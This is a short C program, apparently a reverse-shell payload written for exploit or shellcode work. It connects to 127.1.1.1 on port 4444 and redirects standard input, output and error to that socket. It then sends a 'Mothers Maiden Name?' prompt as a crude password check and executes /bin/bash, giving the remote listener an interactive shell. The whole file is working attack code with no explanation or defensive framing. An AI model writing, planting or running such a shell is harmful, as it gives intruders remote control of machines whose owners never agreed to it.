// Author: Bobby Cooke
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> /* superset of previous */
#include <stdlib.h>
int main(void)
{
 int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
 struct sockaddr_in ipSocketAddr = { 
  .sin_family = AF_INET, 
  .sin_port = htons(4444), 
  .sin_addr.s_addr = inet_addr("127.1.1.1") 
 };
 connect(ipv4Socket, (struct sockaddr*)&ipSocketAddr, sizeof(ipSocketAddr)); 
 dup2(ipv4Socket, 0); // Standard Input
 dup2(ipv4Socket, 1); // Standard Output
 dup2(ipv4Socket, 2); // Standard Error
 write(ipv4Socket, "Mothers Maiden Name?", 20); 
 char buff[4];
 read(ipv4Socket, buff, 4);
 execve("/bin/bash", NULL, NULL);
}   

